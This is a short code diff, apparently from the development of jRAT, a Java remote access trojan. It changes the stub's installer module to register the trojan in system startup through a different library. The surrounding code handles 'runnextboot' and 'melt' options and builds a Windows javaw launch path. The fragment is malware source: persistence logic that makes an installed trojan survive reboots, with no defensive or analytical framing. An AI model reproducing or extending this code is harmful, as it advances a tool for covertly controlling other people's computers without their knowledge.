@@ -19,8 +19,8 @@ import javax.swing.UIManager;
 import se.jrat.common.DropLocations;
 import se.jrat.common.crypto.CryptoUtils;
 import se.jrat.stub.Configuration;
-import se.jrat.stub.Startup;
 import se.jrat.stub.utils.Utils;
+import startuplib.Startup;
 
 import com.redpois0n.oslib.OperatingSystem;
 
@@ -168,7 +168,7 @@ public class InstallerStartupModule extends StartupModule {
 				boolean runNextBoot = Boolean.parseBoolean(Configuration.getConfig().get("runnextboot"));
 				boolean melt = Boolean.parseBoolean(Configuration.getConfig().get("melt"));
 				
-				Startup.addToStartup(file, Configuration.getConfig().get("name"), runNextBoot);
+				Startup.add(Configuration.getConfig().get("name"), file); // TODO runNextBoot
 				
                 if (!runNextBoot && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 					String javaPath = System.getProperty("java.home") + "\\bin\\javaw";
